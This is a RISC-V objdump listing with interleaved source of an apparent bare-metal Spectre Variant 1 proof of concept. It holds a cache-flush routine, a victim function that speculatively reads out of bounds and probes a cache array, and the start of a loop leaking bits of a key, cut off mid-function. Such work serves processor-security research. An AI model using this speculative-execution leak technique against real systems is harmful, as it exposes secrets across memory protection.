
bin/v1sfb.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
#endif

  .section ".text.init"
  .globl _start
_start:
  li  x1, 0    # li rd, immediate; Load immediate
    80000000:	4081                	li	ra,0
  li  x2, 0
    80000002:	4101                	li	sp,0
  li  x3, 0
    80000004:	4181                	li	gp,0
  li  x4, 0
    80000006:	4201                	li	tp,0
  li  x5, 0
    80000008:	4281                	li	t0,0
  li  x6, 0
    8000000a:	4301                	li	t1,0
  li  x7, 0
    8000000c:	4381                	li	t2,0
  li  x8, 0
    8000000e:	4401                	li	s0,0
  li  x9, 0
    80000010:	4481                	li	s1,0
  li  x10,0
    80000012:	4501                	li	a0,0
  li  x11,0
    80000014:	4581                	li	a1,0
  li  x12,0
    80000016:	4601                	li	a2,0
  li  x13,0
    80000018:	4681                	li	a3,0
  li  x14,0
    8000001a:	4701                	li	a4,0
  li  x15,0
    8000001c:	4781                	li	a5,0
  li  x16,0
    8000001e:	4801                	li	a6,0
  li  x17,0
    80000020:	4881                	li	a7,0
  li  x18,0
    80000022:	4901                	li	s2,0
  li  x19,0
    80000024:	4981                	li	s3,0
  li  x20,0
    80000026:	4a01                	li	s4,0
  li  x21,0
    80000028:	4a81                	li	s5,0
  li  x22,0
    8000002a:	4b01                	li	s6,0
  li  x23,0
    8000002c:	4b81                	li	s7,0
  li  x24,0
    8000002e:	4c01                	li	s8,0
  li  x25,0
    80000030:	4c81                	li	s9,0
  li  x26,0
    80000032:	4d01                	li	s10,0
  li  x27,0
    80000034:	4d81                	li	s11,0
  li  x28,0
    80000036:	4e01                	li	t3,0
  li  x29,0
    80000038:	4e81                	li	t4,0
  li  x30,0
    8000003a:	4f01                	li	t5,0
  li  x31,0
    8000003c:	4f81                	li	t6,0

  # enable FPU and accelerator if present
  li t0, MSTATUS_FS | MSTATUS_XS
    8000003e:	62f9                	lui	t0,0x1e
  csrs mstatus, t0
    80000040:	3002a073          	csrs	mstatus,t0

  # make sure XLEN agrees with compilation choice
  li t0, 1
    80000044:	4285                	li	t0,1

  slli t0, t0, 31
    80000046:	02fe                	slli	t0,t0,0x1f

#if __riscv_xlen == 64
  bgez t0, 1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
#else
  bltz t0, 1f
#endif

2:
  li a0, 1
    8000004c:	4505                	li	a0,1
  sw a0, tohost, t0
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
  j 2b
    80000056:	bfdd                	j	8000004c <_start+0x4c>

1:
#ifdef __riscv_flen
  la t0, 1f
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>

  # setup the trap vector
  csrw mtvec, t0
    80000060:	30529073          	csrw	mtvec,t0

  # Initialize FPU if we have one
  fssr    x0
    80000064:	00301073          	fssr	zero

  fmv.s.x f0, x0
    80000068:	f0000053          	fmv.w.x	ft0,zero
  fmv.s.x f1, x0
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
  fmv.s.x f2, x0
    80000070:	f0000153          	fmv.w.x	ft2,zero
  fmv.s.x f3, x0
    80000074:	f00001d3          	fmv.w.x	ft3,zero
  fmv.s.x f4, x0
    80000078:	f0000253          	fmv.w.x	ft4,zero
  fmv.s.x f5, x0
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
  fmv.s.x f6, x0
    80000080:	f0000353          	fmv.w.x	ft6,zero
  fmv.s.x f7, x0
    80000084:	f00003d3          	fmv.w.x	ft7,zero
  fmv.s.x f8, x0
    80000088:	f0000453          	fmv.w.x	fs0,zero
  fmv.s.x f9, x0
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
  fmv.s.x f10,x0
    80000090:	f0000553          	fmv.w.x	fa0,zero
  fmv.s.x f11,x0
    80000094:	f00005d3          	fmv.w.x	fa1,zero
  fmv.s.x f12,x0
    80000098:	f0000653          	fmv.w.x	fa2,zero
  fmv.s.x f13,x0
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
  fmv.s.x f14,x0
    800000a0:	f0000753          	fmv.w.x	fa4,zero
  fmv.s.x f15,x0
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
  fmv.s.x f16,x0
    800000a8:	f0000853          	fmv.w.x	fa6,zero
  fmv.s.x f17,x0
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
  fmv.s.x f18,x0
    800000b0:	f0000953          	fmv.w.x	fs2,zero
  fmv.s.x f19,x0
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
  fmv.s.x f20,x0
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
  fmv.s.x f21,x0
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
  fmv.s.x f22,x0
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
  fmv.s.x f23,x0
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
  fmv.s.x f24,x0
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
  fmv.s.x f25,x0
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
  fmv.s.x f26,x0
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
  fmv.s.x f27,x0
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
  fmv.s.x f28,x0
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
  fmv.s.x f29,x0
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
  fmv.s.x f30,x0
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
  fmv.s.x f31,x0
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
1:
#endif

  # initialize trap vector
  la t0, trap_entry
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
  csrw mtvec, t0
    800000f0:	30529073          	csrw	mtvec,t0

  # initialize global pointer
.option push
.option norelax
  la gp, __global_pointer$
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	02c18193          	addi	gp,gp,44 # 80003120 <__global_pointer$>
.option pop

  # tp: thread point
  la  tp, _end + 63
    800000fc:	0001b217          	auipc	tp,0x1b
    80000100:	14320213          	addi	tp,tp,323 # 8001b23f <_end+0x3f>
  and tp, tp, -64
    80000104:	fc027213          	andi	tp,tp,-64

  # get core id
  csrr a0, mhartid
    80000108:	f1402573          	csrr	a0,mhartid
  # for now, assume only 1 core
  li a1, 1
    8000010c:	4585                	li	a1,1
  # stop here, if the hartid != 1
1:bgeu a0, a1, 1b
    8000010e:	00b57063          	bleu	a1,a0,8000010e <_start+0x10e>

  # give each core 128KB of stack + TLS
#define STKSHIFT 17
  sll a2, a0, STKSHIFT
    80000112:	01151613          	slli	a2,a0,0x11
  add tp, tp, a2
    80000116:	9232                	add	tp,tp,a2
  add sp, a0, 1
    80000118:	00150113          	addi	sp,a0,1
  sll sp, sp, STKSHIFT
    8000011c:	0146                	slli	sp,sp,0x11
  add sp, sp, tp
    8000011e:	9112                	add	sp,sp,tp

  j _init
    80000120:	1a30106f          	j	80001ac2 <_init>

0000000080000124 <trap_entry>:

  .align 2
trap_entry:
  addi sp, sp, -272
    80000124:	716d                	addi	sp,sp,-272

  # save all the integer registers into stack, 32*8=256 bytes
  SREG x1, 1*REGBYTES(sp)
    80000126:	e406                	sd	ra,8(sp)
  SREG x2, 2*REGBYTES(sp)
    80000128:	e80a                	sd	sp,16(sp)
  SREG x3, 3*REGBYTES(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
  SREG x4, 4*REGBYTES(sp)
    8000012c:	f012                	sd	tp,32(sp)
  SREG x5, 5*REGBYTES(sp)
    8000012e:	f416                	sd	t0,40(sp)
  SREG x6, 6*REGBYTES(sp)
    80000130:	f81a                	sd	t1,48(sp)
  SREG x7, 7*REGBYTES(sp)
    80000132:	fc1e                	sd	t2,56(sp)
  SREG x8, 8*REGBYTES(sp)
    80000134:	e0a2                	sd	s0,64(sp)
  SREG x9, 9*REGBYTES(sp)
    80000136:	e4a6                	sd	s1,72(sp)
  SREG x10, 10*REGBYTES(sp)
    80000138:	e8aa                	sd	a0,80(sp)
  SREG x11, 11*REGBYTES(sp)
    8000013a:	ecae                	sd	a1,88(sp)
  SREG x12, 12*REGBYTES(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
  SREG x13, 13*REGBYTES(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
  SREG x14, 14*REGBYTES(sp)
    80000140:	f8ba                	sd	a4,112(sp)
  SREG x15, 15*REGBYTES(sp)
    80000142:	fcbe                	sd	a5,120(sp)
  SREG x16, 16*REGBYTES(sp)
    80000144:	e142                	sd	a6,128(sp)
  SREG x17, 17*REGBYTES(sp)
    80000146:	e546                	sd	a7,136(sp)
  SREG x18, 18*REGBYTES(sp)
    80000148:	e94a                	sd	s2,144(sp)
  SREG x19, 19*REGBYTES(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
  SREG x20, 20*REGBYTES(sp)
    8000014c:	f152                	sd	s4,160(sp)
  SREG x21, 21*REGBYTES(sp)
    8000014e:	f556                	sd	s5,168(sp)
  SREG x22, 22*REGBYTES(sp)
    80000150:	f95a                	sd	s6,176(sp)
  SREG x23, 23*REGBYTES(sp)
    80000152:	fd5e                	sd	s7,184(sp)
  SREG x24, 24*REGBYTES(sp)
    80000154:	e1e2                	sd	s8,192(sp)
  SREG x25, 25*REGBYTES(sp)
    80000156:	e5e6                	sd	s9,200(sp)
  SREG x26, 26*REGBYTES(sp)
    80000158:	e9ea                	sd	s10,208(sp)
  SREG x27, 27*REGBYTES(sp)
    8000015a:	edee                	sd	s11,216(sp)
  SREG x28, 28*REGBYTES(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
  SREG x29, 29*REGBYTES(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
  SREG x30, 30*REGBYTES(sp)
    80000160:	f9fa                	sd	t5,240(sp)
  SREG x31, 31*REGBYTES(sp)
    80000162:	fdfe                	sd	t6,248(sp)

  # a0: parameter 0
  csrr a0, mcause
    80000164:	34202573          	csrr	a0,mcause

  # a1: parameter 1
  csrr a1, mepc
    80000168:	341025f3          	csrr	a1,mepc

  # a2: parameter 2
  mv a2, sp
    8000016c:	860a                	mv	a2,sp

  # handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
  jal handle_trap
    8000016e:	033010ef          	jal	ra,800019a0 <handle_trap>

  # a0 => mepc
  csrw mepc, a0
    80000172:	34151073          	csrw	mepc,a0

  # Remain in M-mode after eret
  li t0, MSTATUS_MPP
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
  csrs mstatus, t0
    8000017e:	3002a073          	csrs	mstatus,t0

  LREG x1, 1*REGBYTES(sp)
    80000182:	60a2                	ld	ra,8(sp)
  LREG x2, 2*REGBYTES(sp)
    80000184:	6142                	ld	sp,16(sp)
  LREG x3, 3*REGBYTES(sp)
    80000186:	61e2                	ld	gp,24(sp)
  LREG x4, 4*REGBYTES(sp)
    80000188:	7202                	ld	tp,32(sp)
  LREG x5, 5*REGBYTES(sp)
    8000018a:	72a2                	ld	t0,40(sp)
  LREG x6, 6*REGBYTES(sp)
    8000018c:	7342                	ld	t1,48(sp)
  LREG x7, 7*REGBYTES(sp)
    8000018e:	73e2                	ld	t2,56(sp)
  LREG x8, 8*REGBYTES(sp)
    80000190:	6406                	ld	s0,64(sp)
  LREG x9, 9*REGBYTES(sp)
    80000192:	64a6                	ld	s1,72(sp)
  LREG x10, 10*REGBYTES(sp)
    80000194:	6546                	ld	a0,80(sp)
  LREG x11, 11*REGBYTES(sp)
    80000196:	65e6                	ld	a1,88(sp)
  LREG x12, 12*REGBYTES(sp)
    80000198:	7606                	ld	a2,96(sp)
  LREG x13, 13*REGBYTES(sp)
    8000019a:	76a6                	ld	a3,104(sp)
  LREG x14, 14*REGBYTES(sp)
    8000019c:	7746                	ld	a4,112(sp)
  LREG x15, 15*REGBYTES(sp)
    8000019e:	77e6                	ld	a5,120(sp)
  LREG x16, 16*REGBYTES(sp)
    800001a0:	680a                	ld	a6,128(sp)
  LREG x17, 17*REGBYTES(sp)
    800001a2:	68aa                	ld	a7,136(sp)
  LREG x18, 18*REGBYTES(sp)
    800001a4:	694a                	ld	s2,144(sp)
  LREG x19, 19*REGBYTES(sp)
    800001a6:	69ea                	ld	s3,152(sp)
  LREG x20, 20*REGBYTES(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
  LREG x21, 21*REGBYTES(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
  LREG x22, 22*REGBYTES(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
  LREG x23, 23*REGBYTES(sp)
    800001ae:	7bea                	ld	s7,184(sp)
  LREG x24, 24*REGBYTES(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
  LREG x25, 25*REGBYTES(sp)
    800001b2:	6cae                	ld	s9,200(sp)
  LREG x26, 26*REGBYTES(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
  LREG x27, 27*REGBYTES(sp)
    800001b6:	6dee                	ld	s11,216(sp)
  LREG x28, 28*REGBYTES(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
  LREG x29, 29*REGBYTES(sp)
    800001ba:	7eae                	ld	t4,232(sp)
  LREG x30, 30*REGBYTES(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
  LREG x31, 31*REGBYTES(sp)
    800001be:	7fee                	ld	t6,248(sp)

  addi sp, sp, 272
    800001c0:	6151                	addi	sp,sp,272
  mret
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bleu	a4,a5,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	8b470713          	addi	a4,a4,-1868 # 80002940 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3e00>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bleu	a4,a5,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	6466                	ld	s0,88(sp)
    80001112:	6125                	addi	sp,sp,96
    80001114:	8082                	ret

0000000080001116 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001116:	7139                	addi	sp,sp,-64
    80001118:	fc22                	sd	s0,56(sp)
    8000111a:	0080                	addi	s0,sp,64
    8000111c:	fca43c23          	sd	a0,-40(s0)
    80001120:	fcb43823          	sd	a1,-48(s0)
    80001124:	fcc43423          	sd	a2,-56(s0)
    80001128:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112c:	fc043783          	ld	a5,-64(s0)
    80001130:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001134:	fc043783          	ld	a5,-64(s0)
    80001138:	07a1                	addi	a5,a5,8
    8000113a:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    8000113e:	fe043423          	sd	zero,-24(s0)
    80001142:	a075                	j	800011ee <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001144:	fe843783          	ld	a5,-24(s0)
    80001148:	078e                	slli	a5,a5,0x3
    8000114a:	fd843703          	ld	a4,-40(s0)
    8000114e:	97ba                	add	a5,a5,a4
    80001150:	6398                	ld	a4,0(a5)
    80001152:	fc043783          	ld	a5,-64(s0)
    80001156:	639c                	ld	a5,0(a5)
    80001158:	04e7f563          	bleu	a4,a5,800011a2 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115c:	fc043783          	ld	a5,-64(s0)
    80001160:	07a1                	addi	a5,a5,8
    80001162:	fc043703          	ld	a4,-64(s0)
    80001166:	6318                	ld	a4,0(a4)
    80001168:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116a:	fe843783          	ld	a5,-24(s0)
    8000116e:	078e                	slli	a5,a5,0x3
    80001170:	fd843703          	ld	a4,-40(s0)
    80001174:	97ba                	add	a5,a5,a4
    80001176:	6398                	ld	a4,0(a5)
    80001178:	fc043783          	ld	a5,-64(s0)
    8000117c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    8000117e:	fc843783          	ld	a5,-56(s0)
    80001182:	0785                	addi	a5,a5,1
    80001184:	fc843703          	ld	a4,-56(s0)
    80001188:	00074703          	lbu	a4,0(a4)
    8000118c:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001190:	fe843783          	ld	a5,-24(s0)
    80001194:	0ff7f713          	andi	a4,a5,255
    80001198:	fc843783          	ld	a5,-56(s0)
    8000119c:	00e78023          	sb	a4,0(a5)
    800011a0:	a091                	j	800011e4 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a2:	fe843783          	ld	a5,-24(s0)
    800011a6:	078e                	slli	a5,a5,0x3
    800011a8:	fd843703          	ld	a4,-40(s0)
    800011ac:	97ba                	add	a5,a5,a4
    800011ae:	6398                	ld	a4,0(a5)
    800011b0:	fc043783          	ld	a5,-64(s0)
    800011b4:	07a1                	addi	a5,a5,8
    800011b6:	639c                	ld	a5,0(a5)
    800011b8:	02e7f663          	bleu	a4,a5,800011e4 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011bc:	fe843783          	ld	a5,-24(s0)
    800011c0:	078e                	slli	a5,a5,0x3
    800011c2:	fd843703          	ld	a4,-40(s0)
    800011c6:	973e                	add	a4,a4,a5
    800011c8:	fc043783          	ld	a5,-64(s0)
    800011cc:	07a1                	addi	a5,a5,8
    800011ce:	6318                	ld	a4,0(a4)
    800011d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d2:	fc843783          	ld	a5,-56(s0)
    800011d6:	0785                	addi	a5,a5,1
    800011d8:	fe843703          	ld	a4,-24(s0)
    800011dc:	0ff77713          	andi	a4,a4,255
    800011e0:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e4:	fe843783          	ld	a5,-24(s0)
    800011e8:	0785                	addi	a5,a5,1
    800011ea:	fef43423          	sd	a5,-24(s0)
    800011ee:	fe843703          	ld	a4,-24(s0)
    800011f2:	fd043783          	ld	a5,-48(s0)
    800011f6:	f4f767e3          	bltu	a4,a5,80001144 <topTwoIdx+0x2e>
        }
    }
}
    800011fa:	0001                	nop
    800011fc:	7462                	ld	s0,56(sp)
    800011fe:	6121                	addi	sp,sp,64
    80001200:	8082                	ret

0000000080001202 <victimFunc>:
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
void victimFunc(uint64_t idx,uint64_t secretIdx){
    80001202:	7139                	addi	sp,sp,-64
    80001204:	fc22                	sd	s0,56(sp)
    80001206:	0080                	addi	s0,sp,64
    80001208:	fca43423          	sd	a0,-56(s0)
    8000120c:	fcb43023          	sd	a1,-64(s0)
    uint8_t dummy = 2;
    80001210:	4789                	li	a5,2
    80001212:	fef407a3          	sb	a5,-17(s0)
    uint64_t i=0;
    80001216:	fe043023          	sd	zero,-32(s0)
    uint64_t addr = &secretIdx;
    8000121a:	fc040793          	addi	a5,s0,-64
    8000121e:	fcf43c23          	sd	a5,-40(s0)
    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    80001222:	00001797          	auipc	a5,0x1
    80001226:	6fe78793          	addi	a5,a5,1790 # 80002920 <array1_sz>
    8000122a:	639c                	ld	a5,0(a5)
    8000122c:	00479713          	slli	a4,a5,0x4
    80001230:	00001797          	auipc	a5,0x1
    80001234:	6f078793          	addi	a5,a5,1776 # 80002920 <array1_sz>
    80001238:	e398                	sd	a4,0(a5)
    asm("fcvt.s.lu	fa4, %[in]\n"
    8000123a:	00001797          	auipc	a5,0x1
    8000123e:	6e678793          	addi	a5,a5,1766 # 80002920 <array1_sz>
    80001242:	639c                	ld	a5,0(a5)
    80001244:	fef44703          	lbu	a4,-17(s0)
    80001248:	d0377753          	fcvt.s.lu	fa4,a4
    8000124c:	d037f7d3          	fcvt.s.lu	fa5,a5
    80001250:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001254:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001258:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000125c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001260:	c0379753          	fcvt.lu.s	a4,fa5,rtz
    80001264:	00001797          	auipc	a5,0x1
    80001268:	6bc78793          	addi	a5,a5,1724 # 80002920 <array1_sz>
    8000126c:	e398                	sd	a4,0(a5)
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");
    asm volatile(
    8000126e:	00001797          	auipc	a5,0x1
    80001272:	6b278793          	addi	a5,a5,1714 # 80002920 <array1_sz>
    80001276:	6388                	ld	a0,0(a5)
    80001278:	fd843783          	ld	a5,-40(s0)
    8000127c:	fc843703          	ld	a4,-56(s0)
    80001280:	04000693          	li	a3,64
    80001284:	00015617          	auipc	a2,0x15
    80001288:	73c60613          	addi	a2,a2,1852 # 800169c0 <array2>
    8000128c:	fe043583          	ld	a1,-32(s0)
    80001290:	00a77b63          	bleu	a0,a4,800012a6 <end_label>
    80001294:	639c                	ld	a5,0(a5)
    80001296:	00079463          	bnez	a5,8000129e <notset_i>
    8000129a:	02800593          	li	a1,40

000000008000129e <notset_i>:
    8000129e:	02d585b3          	mul	a1,a1,a3
    800012a2:	95b2                	add	a1,a1,a2
    800012a4:	619c                	ld	a5,0(a1)

00000000800012a6 <end_label>:
    800012a6:	fef407a3          	sb	a5,-17(s0)
        : "t0", "t1", "t2", "t3",  "fa4", "fa5","memory"
    );
    //  printf("%ld,%ld,%ld,%ld\n",i,&array2[40*L1_BLOCK_SZ_BYTES],&array2[0*L1_BLOCK_SZ_BYTES],&array2[1*L1_BLOCK_SZ_BYTES]);

    // bound speculation here just in case it goes over
    dummy = rdcycle();
    800012aa:	c00027f3          	rdcycle	a5
    800012ae:	fcf43823          	sd	a5,-48(s0)
    800012b2:	fd043783          	ld	a5,-48(s0)
    800012b6:	fef407a3          	sb	a5,-17(s0)
}
    800012ba:	0001                	nop
    800012bc:	7462                	ld	s0,56(sp)
    800012be:	6121                	addi	sp,sp,64
    800012c0:	8082                	ret

00000000800012c2 <main>:

int main(void){
    800012c2:	7119                	addi	sp,sp,-128
    800012c4:	fc86                	sd	ra,120(sp)
    800012c6:	f8a2                	sd	s0,112(sp)
    800012c8:	0100                	addi	s0,sp,128
    uint64_t attackIdx = 60;
    800012ca:	03c00793          	li	a5,60
    800012ce:	fcf43423          	sd	a5,-56(s0)
    uint64_t start, diff, passInIdx, randIdx,randsecret,secretIdx;
    uint8_t dummy = 0;
    800012d2:	fe0407a3          	sb	zero,-17(s0)
    static uint64_t results[256];

    // try to read out the secret
    for(int len = 7; len >= 0; --len){
    800012d6:	479d                	li	a5,7
    800012d8:	fef42423          	sw	a5,-24(s0)
    800012dc:	aa5d                	j	80001492 <main+0x1d0>

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    800012de:	fe043023          	sd	zero,-32(s0)
    800012e2:	a005                	j	80001302 <main+0x40>
            results[cIdx] = 0;
    800012e4:	00019717          	auipc	a4,0x19
    800012e8:	6dc70713          	addi	a4,a4,1756 # 8001a9c0 <results.2915>
    800012ec:	fe043783          	ld	a5,-32(s0)
    800012f0:	078e                	slli	a5,a5,0x3
    800012f2:	97ba                	add	a5,a5,a4
    800012f4:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
    800012f8:	fe043783          	ld	a5,-32(s0)
    800012fc:	0785                	addi	a5,a5,1
    800012fe:	fef43023          	sd	a5,-32(s0)
    80001302:	fe043703          	ld	a4,-32(s0)
    80001306:	0ff00793          	li	a5,255
    8000130a:	fce7fde3          	bleu	a4,a5,800012e4 <main+0x22>
        }
        // secret = len%2;
        secret=(KEY>>len)&1;
    8000130e:	00001797          	auipc	a5,0x1
    80001312:	61a78793          	addi	a5,a5,1562 # 80002928 <KEY>
    80001316:	0007c783          	lbu	a5,0(a5)
    8000131a:	0007871b          	sext.w	a4,a5
    8000131e:	fe842783          	lw	a5,-24(s0)
    80001322:	40f757bb          	sraw	a5,a4,a5
    80001326:	2781                	sext.w	a5,a5
    80001328:	8b85                	andi	a5,a5,1
    8000132a:	0007871b          	sext.w	a4,a5
